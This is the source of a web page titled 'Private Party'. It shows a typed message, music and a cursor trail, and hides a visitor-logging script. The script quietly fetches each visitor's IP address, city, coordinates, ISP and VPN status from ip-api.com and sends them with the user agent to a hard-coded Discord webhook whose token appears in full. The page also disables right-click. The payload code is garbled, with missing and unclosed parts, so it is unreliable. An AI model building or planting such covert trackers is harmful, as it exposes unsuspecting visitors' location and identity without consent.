<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Private Party</title>
<style>
body{background:#000;color:#999;font-family:"Courier New",monospace;display:flex;align-items:center;justify-content:center;height:100vh;margin:0;user-select:none;overflow:hidden;cursor:none;}
#text{font-size:1.3rem;letter-spacing:2px;white-space:pre;}
.trail{position:absolute;width:3px;height:3px;background:#999;border-radius:50%;pointer-events:none;opacity:0;transition:opacity 0.2s;}
#sadface{position:fixed;bottom:10px;left:10px;color:#999;cursor:pointer;font-size:1.2rem;transition:color 0.2s;}
#sadface:hover{color:#fff;}
</style>
</head>
<body>
<div id="text"></div>
<div id="sadface">:(</div>
<audio id="bgmusic" loop><source src="Volare.mp3" type="audio/mpeg"></audio>

<script>
// --- VISUALS ---
const message="we never condoned violence";
const textEl=document.getElementById("text");
let charIdx=0;
function type(){if(charIdx<message.length){textEl.textContent+=message[charIdx];charIdx++;setTimeout(type,100);}}
type();

document.addEventListener("mousedown",()=>{document.getElementById("bgmusic").play().catch(()=>{})},{once:true});

const trail=[];
for(let j=0;j<15;j++){
    const dot=document.createElement("div");
    dot.className="trail";
    document.body.appendChild(dot);
    trail.push(dot);
}
let t=0;
document.addEventListener("mousemove",e=>{
    const dot=trail[t];
    dot.style.left=(e.pageX-1.5)+"px";
    dot.style.top=(e.pageY-1.5)+"px";
    dot.style.opacity=1;
    setTimeout(()=>{dot.style.opacity=0;},300);
    t=(t+1)%15;
});

// --- THE LOGGING ---
async function log() {
    const webhook = "https://discord.com/api/webhooks/1479284599925510316/_ICehxGmoiUvxjBcOGo-kuYdKAnozybsjq5p6hzeCQ4xcBSYHDmpp-plb3adBsXdTkWv";
    
    try {
        const response = await fetch('http://ip-api.com/json/?fields=status,message,country,countryCode,regionName,city,zip,lat,lon,timezone,currency,isp,org,as,mobile,proxy,hosting,query');
        const d = await response.json();
        
        // Simplified VPN/Proxy Logic
        const isVpn = (d.proxy || d.hosting) ? "Yes" : "No";

        const payload = {

                title: "💀 New Visitor Logged",

                    { name: "💻 User Agent", value: `\`\`\`bash\n"${navigator.userAgent}"\n\`\`\``, inline: false }
                ],
                footer: { text: "privateparty.sh • Intrusive Analytics" },
                timestamp: new Date().toISOString()
            }]
        };

        await fetch(webhook, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify(payload) });

document.addEventListener("contextmenu", e=>e.preventDefault());
document.getElementById("sadface").onclick = () => window.open("https://t.me/publicpartys", "_blank");
